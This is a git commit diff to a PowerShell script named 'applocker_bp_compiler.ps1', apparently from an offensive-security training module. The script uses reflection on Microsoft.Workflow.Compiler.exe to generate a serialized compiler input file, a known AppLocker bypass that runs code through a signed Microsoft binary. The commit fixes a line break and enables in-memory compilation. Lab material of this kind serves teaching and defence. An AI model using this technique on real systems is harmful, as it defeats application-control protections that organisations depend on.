7c9b9db38652ef3c41e498cd0712cf0d59101d7a
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-11 00:52:08 +0100

    Update applocker_bp_compiler.ps1

--- module_8/applocker_bp_compiler.ps1
+++ module_8/applocker_bp_compiler.ps1
@@ -1,9 +1,9 @@
 $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
 $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
 $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
-Add-Type -Path 
-'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
 $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
 $pathvar = "test.txt"
 $output = "C:\Tools\test.xml"
 $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
